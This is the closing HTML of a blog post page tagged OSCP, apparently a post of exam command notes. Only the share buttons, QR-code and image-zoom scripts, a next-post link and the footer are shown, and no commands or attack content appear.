                    <a href="https://service.weibo.com/share/share.php?&amp;url=https://klearcc.github.io/post/%E7%BB%84%E4%BB%B6%E6%94%BB%E5%87%BB%E6%B1%87%E6%80%BB/&amp;title=%e4%bb%85%e9%92%88%e5%af%b9OSCP%e8%80%83%e8%af%95%e7%9a%84%e5%91%bd%e4%bb%a4%e7%ac%94%e8%ae%b0&amp;pic=https://klearcc.github.io/icons/avatar.png&amp;searchPic=false" title="分享到「新浪微博」" target="_blank" rel="noopener"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 512 512" class="icon weibo-icon"><path d="M407 177.6c7.6-24-13.4-46.8-37.4-41.7-22 4.8-28.8-28.1-7.1-32.8 50.1-10.9 92.3 37.1 76.5 84.8-6.8 21.2-38.8 10.8-32-10.3zM214.8 446.7C108.5 446.7 0 395.3 0 310.4c0-44.3 28-95.4 76.3-143.7C176 67 279.5 65.8 249.9 161c-4 13.1 12.3 5.7 12.3 6 79.5-33.6 140.5-16.8 114 51.4-3.7 9.4 1.1 10.9 8.3 13.1 135.7 42.3 34.8 215.2-169.7 215.2zm143.7-146.3c-5.4-55.7-78.5-94-163.4-85.7-84.8 8.6-148.8 60.3-143.4 116s78.5 94 163.4 85.7c84.8-8.6 148.8-60.3 143.4-116zM347.9 35.1c-25.9 5.6-16.8 43.7 8.3 38.3 72.3-15.2 134.8 52.8 111.7 124-7.4 24.2 29.1 37 37.4 12 31.9-99.8-55.1-195.9-157.4-174.3zm-78.5 311c-17.1 38.8-66.8 60-109.1 46.3-40.8-13.1-58-53.4-40.3-89.7 17.7-35.4 63.1-55.4 103.4-45.1 42 10.8 63.1 50.2 46 88.5zm-86.3-30c-12.9-5.4-30 .3-38 12.9-8.3 12.9-4.3 28 8.6 34 13.1 6 30.8.3 39.1-12.9 8-13.1 3.7-28.3-9.7-34zm32.6-13.4c-5.1-1.7-11.4.6-14.3 5.4-2.9 5.1-1.4 10.6 3.7 12.9 5.1 2 11.7-.3 14.6-5.4 2.8-5.2 1.1-10.9-4-12.9z"/></svg></a>
                </div>
            

            
                <div class="share-item douban">
                    
                    <a href="https://www.douban.com/share/service?href=https://klearcc.github.io/post/%E7%BB%84%E4%BB%B6%E6%94%BB%E5%87%BB%E6%B1%87%E6%80%BB/&amp;name=%e4%bb%85%e9%92%88%e5%af%b9OSCP%e8%80%83%e8%af%95%e7%9a%84%e5%91%bd%e4%bb%a4%e7%ac%94%e8%ae%b0&amp;text=%e6%ad%a4%e5%91%bd%e4%bb%a4%e7%ac%94%e8%ae%b0%e4%bb%85%e9%92%88%e5%af%b9OSCP%e8%80%83%e8%af%95%ef%bc%8c%e4%b8%8d%e5%8c%85%e6%8b%ac%e8%80%83%e8%af%95%e2%80%a6%e2%80%a6" title="分享到「豆瓣」" target="_blank" rel="noopener"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" class="icon douban-icon"><path d="M.643.92v2.412h22.714V.92H.643zm1.974 4.926v9.42h18.764v-9.42H2.617zm2.72 2.408H18.69v4.605H5.338V8.254zm1.657 7.412l-2.512.938c1.037 1.461 1.87 2.825 2.512 4.091H0v2.385h24v-2.385h-6.678c.818-1.176 1.589-2.543 2.303-4.091l-2.73-.938a29.952 29.952 0 01-2.479 5.03h-4.75c-.786-1.962-1.677-3.641-2.672-5.03Z"/></svg></a>
                </div>
            

            
                <div class="share-item qq">
                    
                    <a href="https://connect.qq.com/widget/shareqq/index.html?url=https://klearcc.github.io/post/%E7%BB%84%E4%BB%B6%E6%94%BB%E5%87%BB%E6%B1%87%E6%80%BB/&amp;title=%e4%bb%85%e9%92%88%e5%af%b9OSCP%e8%80%83%e8%af%95%e7%9a%84%e5%91%bd%e4%bb%a4%e7%ac%94%e8%ae%b0&amp;summary=%e6%ad%a4%e5%91%bd%e4%bb%a4%e7%ac%94%e8%ae%b0%e4%bb%85%e9%92%88%e5%af%b9OSCP%e8%80%83%e8%af%95%ef%bc%8c%e4%b8%8d%e5%8c%85%e6%8b%ac%e8%80%83%e8%af%95%e2%80%a6%e2%80%a6&amp;pics=https://klearcc.github.io/icons/avatar.png&amp;site=Klear%c2%b7blog" title="分享到「QQ」" target="_blank" rel="noopener"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 448 512" class="icon qq-icon"><path d="M433.754 420.445c-11.526 1.393-44.86-52.741-44.86-52.741 0 31.345-16.136 72.247-51.051 101.786 16.842 5.192 54.843 19.167 45.803 34.421-7.316 12.343-125.51 7.881-159.632 4.037-34.122 3.844-152.316 8.306-159.632-4.037-9.045-15.25 28.918-29.214 45.783-34.415-34.92-29.539-51.059-70.445-51.059-101.792 0 0-33.334 54.134-44.859 52.741-5.37-.65-12.424-29.644 9.347-99.704 10.261-33.024 21.995-60.478 40.144-105.779C60.683 98.063 108.982.006 224 0c113.737.006 163.156 96.133 160.264 214.963 18.118 45.223 29.912 72.85 40.144 105.778 21.768 70.06 14.716 99.053 9.346 99.704z"/></svg></a>
                </div>
            

            
                <div class="share-item qzone">
                    
                    <a href="https://sns.qzone.qq.com/cgi-bin/qzshare/cgi_qzshare_onekey?url=https://klearcc.github.io/post/%E7%BB%84%E4%BB%B6%E6%94%BB%E5%87%BB%E6%B1%87%E6%80%BB/&amp;title=%e4%bb%85%e9%92%88%e5%af%b9OSCP%e8%80%83%e8%af%95%e7%9a%84%e5%91%bd%e4%bb%a4%e7%ac%94%e8%ae%b0&amp;summary=%e6%ad%a4%e5%91%bd%e4%bb%a4%e7%ac%94%e8%ae%b0%e4%bb%85%e9%92%88%e5%af%b9OSCP%e8%80%83%e8%af%95%ef%bc%8c%e4%b8%8d%e5%8c%85%e6%8b%ac%e8%80%83%e8%af%95%e2%80%a6%e2%80%a6&amp;pics=https://klearcc.github.io/icons/avatar.png&amp;site=Klear%c2%b7blog" title="分享到「QQ 空间」" target="_blank" rel="noopener"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" class="icon qzone-icon"><path d="M23.985 9.202c-.032-.099-.127-.223-.334-.258-.207-.036-7.351-1.406-7.351-1.406s-.105-.022-.198-.07c-.092-.047-.127-.167-.127-.167S12.447.956 12.349.77C12.25.583 12.104.532 12 .532c-.104 0-.251.051-.349.238-.098.186-3.626 6.531-3.626 6.531s-.035.12-.128.167c-.092.047-.197.07-.197.07S.556 8.908.348 8.943c-.208.036-.302.16-.333.258a.477.477 0 0 0 .125.449l5.362 5.49s.072.08.119.172c.016.104.005.21.005.21s-1.189 7.242-1.22 7.45.075.369.159.43c.083.062.233.106.421.013.189-.093 6.812-3.261 6.812-3.261s.098-.044.201-.061c.103-.017.201.061.201.061s6.623 3.168 6.812 3.261c.188.094.338.049.421-.013a.463.463 0 0 0 .159-.43c-.021-.14-.93-5.677-.93-5.677.876-.54 1.425-1.039 1.849-1.747-2.594.969-6.006 1.717-9.415 1.866-.915.041-2.41.097-3.473-.015-.678-.071-1.17-.144-1.243-.438-.053-.215.054-.46.545-.831a2640.5 2640.5 0 0 1 2.861-2.155c1.285-.968 3.559-2.47 3.559-2.731 0-.285-2.144-.781-4.037-.781-1.945 0-2.275.132-2.811.168-.488.034-.769.005-.804-.138-.06-.248.183-.389.588-.568.709-.314 1.86-.594 1.984-.626.194-.052 3.082-.805 5.618-.535 1.318.14 3.244.668 3.244 1.276 0 .342-1.721 1.494-3.225 2.597-1.149.843-2.217 1.561-2.217 1.688 0 .342 3.533 1.241 6.689 1.01l.003-.022c.048-.092.119-.172.119-.172l5.362-5.49a.477.477 0 0 0 .127-.449z"/></svg></a>
                </div>
            

            
                <div class="share-item qrcode">
                    <div class="qrcode-container" title="通过「二维码」"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 448 512" class="icon qrcode-icon"><path d="M0 224h192V32H0v192zM64 96h64v64H64V96zm192-64v192h192V32H256zm128 128h-64V96h64v64zM0 480h192V288H0v192zm64-128h64v64H64v-64zm352-64h32v128h-96v-32h-32v96h-64V288h96v32h64v-32zm0 160h32v32h-32v-32zm-64 0h32v32h-32v-32z"/></svg><div id="qrcode-img"></div>
                    </div>
                    <script src="https://cdn.jsdelivr.net/npm/qrcode-generator@1.4.4/qrcode.min.js"></script>

<script>
    const typeNumber = 0;
    const errorCorrectionLevel = 'L';
    const qr = qrcode(typeNumber, errorCorrectionLevel);
    qr.addData('https:\/\/klearcc.github.io\/post\/%E7%BB%84%E4%BB%B6%E6%94%BB%E5%87%BB%E6%B1%87%E6%80%BB\/');
    qr.make();
    document.getElementById('qrcode-img').innerHTML = qr.createImgTag();
</script>

                </div>
            

        </div>

    </div>




        
    
    



        
    
        <div class="post-tags">
            
                
                
                
                
                    
                    <a href="/tags/oscp/" rel="tag" class="post-tags-link"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 512 512" class="icon tag-icon"><path d="M0 252.118V48C0 21.49 21.49 0 48 0h204.118a48 48 0 0 1 33.941 14.059l211.882 211.882c18.745 18.745 18.745 49.137 0 67.882L293.823 497.941c-18.745 18.745-49.137 18.745-67.882 0L14.059 286.059A48 48 0 0 1 0 252.118zM112 64c-26.51 0-48 21.49-48 48s21.49 48 48 48 48-21.49 48-48-21.49-48-48-48z"/></svg>OSCP</a>
                
            
        </div>
    



        


        


        
    
        
        
    
    
    
    
        <ul class="post-nav">
            
            
                <li class="post-nav-next">
                    <a href="/post/m1%E4%BD%BF%E7%94%A8proxychains/" rel="next">ARM芯片下的proxychains &gt;</a>
                </li>
            
        </ul>
    



        


    </div>
</main>


            
    <div id="back-to-top" class="back-to-top">
        <a href="#"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 448 512" class="icon arrow-up"><path d="M34.9 289.5l-22.2-22.2c-9.4-9.4-9.4-24.6 0-33.9L207 39c9.4-9.4 24.6-9.4 33.9 0l194.3 194.3c9.4 9.4 9.4 24.6 0 33.9L413 289.4c-9.5 9.5-25 9.3-34.3-.4L264 168.6V456c0 13.3-10.7 24-24 24h-32c-13.3 0-24-10.7-24-24V168.6L69.2 289.1c-9.3 9.8-24.8 10-34.3.4z"/></svg></a>
    </div>


            
    <footer id="footer" class="footer">
        <div class="footer-inner">
            <div class="site-info">©&nbsp;2021–2024&nbsp;<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 512 512" class="icon footer-icon"><path d="M462.3 62.6C407.5 15.9 326 24.3 275.7 76.2L256 96.5l-19.7-20.3C186.1 24.3 104.5 15.9 49.7 62.6c-62.8 53.6-66.1 149.8-9.9 207.9l193.5 199.8c12.5 12.9 32.8 12.9 45.3 0l193.5-199.8c56.3-58.1 53-154.3-9.8-207.9z"/></svg>&nbsp;Klear</div><div class="site-copyright"><a href="https://creativecommons.org/licenses/by-nc-sa/4.0/deed.zh" target="_blank" rel="noopener">CC BY-NC-SA 4.0</a></div>

            
    
        <ul class="socials"><li class="socials-item">
                    <a href="/rss.xml" target="_blank" rel="external noopener" title="RSS"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" class="icon social-icon"><path d="M19.199 24C19.199 13.467 10.533 4.8 0 4.8V0c13.165 0 24 10.835 24 24h-4.801zM3.291 17.415c1.814 0 3.293 1.479 3.293 3.295 0 1.813-1.485 3.29-3.301 3.29C1.47 24 0 22.526 0 20.71s1.475-3.294 3.291-3.295zM15.909 24h-4.665c0-6.169-5.075-11.245-11.244-11.245V8.09c8.727 0 15.909 7.184 15.909 15.91z"/></svg></a>
                </li><li class="socials-item">
                    <a href="mailto:baicaix86@gmail.com" target="_blank" rel="external noopener" title="Email"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 512 512" class="icon social-icon"><path d="M464 64H48C21.49 64 0 85.49 0 112v288c0 26.51 21.49 48 48 48h416c26.51 0 48-21.49 48-48V112c0-26.51-21.49-48-48-48zm0 48v40.805c-22.422 18.259-58.168 46.651-134.587 106.49-16.841 13.247-50.201 45.072-73.413 44.701-23.208.375-56.579-31.459-73.413-44.701C106.18 199.465 70.425 171.067 48 152.805V112h416zM48 400V214.398c22.914 18.251 55.409 43.862 104.938 82.646 21.857 17.205 60.134 55.186 103.062 54.955 42.717.231 80.509-37.199 103.053-54.947 49.528-38.783 82.032-64.401 104.947-82.653V400H48z"/></svg></a>
                </li><li class="socials-item">
                    <a href="https://github.com/klearcc" target="_blank" rel="external noopener" title="GitHub"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" class="icon social-icon"><path d="M12 .297c-6.63 0-12 5.373-12 12 0 5.303 3.438 9.8 8.205 11.385.6.113.82-.258.82-.577 0-.285-.01-1.04-.015-2.04-3.338.724-4.042-1.61-4.042-1.61C4.422 18.07 3.633 17.7 3.633 17.7c-1.087-.744.084-.729.084-.729 1.205.084 1.838 1.236 1.838 1.236 1.07 1.835 2.809 1.305 3.495.998.108-.776.417-1.305.76-1.605-2.665-.3-5.466-1.332-5.466-5.93 0-1.31.465-2.38 1.235-3.22-.135-.303-.54-1.523.105-3.176 0 0 1.005-.322 3.3 1.23.96-.267 1.98-.399 3-.405 1.02.006 2.04.138 3 .405 2.28-1.552 3.285-1.23 3.285-1.23.645 1.653.24 2.873.12 3.176.765.84 1.23 1.91 1.23 3.22 0 4.61-2.805 5.625-5.475 5.92.42.36.81 1.096.81 2.22 0 1.606-.015 2.896-.015 3.286 0 .315.21.69.825.57C20.565 22.092 24 17.592 24 12.297c0-6.627-5.373-12-12-12"/></svg></a>
                </li><li class="socials-item">
                    <a href="https://twitter.com/En0lang" target="_blank" rel="external noopener" title="Twitter"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 512 512" class="icon social-icon"><path d="M459.37 151.716c.325 4.548.325 9.097.325 13.645 0 138.72-105.583 298.558-298.558 298.558-59.452 0-114.68-17.219-161.137-47.106 8.447.974 16.568 1.299 25.34 1.299 49.055 0 94.213-16.568 130.274-44.832-46.132-.975-84.792-31.188-98.112-72.772 6.498.974 12.995 1.624 19.818 1.624 9.421 0 18.843-1.3 27.614-3.573-48.081-9.747-84.143-51.98-84.143-102.985v-1.299c13.969 7.797 30.214 12.67 47.431 13.319-28.264-18.843-46.781-51.005-46.781-87.391 0-19.492 5.197-37.36 14.294-52.954 51.655 63.675 129.3 105.258 216.365 109.807-1.624-7.797-2.599-15.918-2.599-24.04 0-57.828 46.782-104.934 104.934-104.934 30.213 0 57.502 12.67 76.67 33.137 23.715-4.548 46.456-13.32 66.599-25.34-7.798 24.366-24.366 44.833-46.132 57.827 21.117-2.273 41.584-8.122 60.426-16.243-14.292 20.791-32.161 39.308-52.628 54.253z"/></svg></a>
                </li><li class="socials-item">
                    <a href="https://t.me/Darlenor" target="_blank" rel="external noopener" title="Telegram"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 496 512" class="icon social-icon"><path d="M248 8C111 8 0 119 0 256s111 248 248 248 248-111 248-248S385 8 248 8zm121.8 169.9l-40.7 191.8c-3 13.6-11.1 16.9-22.4 10.5l-62-45.7-29.9 28.8c-3.3 3.3-6.1 6.1-12.5 6.1l4.4-63.1 114.9-103.8c5-4.4-1.1-6.9-7.7-2.5l-142 89.4-61.2-19.1c-13.3-4.2-13.6-13.3 2.8-19.7l239.1-92.2c11.1-4 20.8 2.7 17.2 19.5z"/></svg></a>
                </li></ul>
    



            
        </div>
    </footer>


        </div>
        

        








    <script src="https://cdn.jsdelivr.net/npm/medium-zoom@latest/dist/medium-zoom.min.js"></script>

<script>
    let imgNodes = document.querySelectorAll('div.post-body img');
    imgNodes = Array.from(imgNodes).filter(node => node.parentNode.tagName !== "A");

    mediumZoom(imgNodes, {
        background: 'hsla(var(--color-bg-h), var(--color-bg-s), var(--color-bg-l), 0.95)'
    })
</script>




    <script src="https://cdn.jsdelivr.net/npm/instant.page@5.1.0/instantpage.min.js" type="module" defer></script>






    </body>
</html>
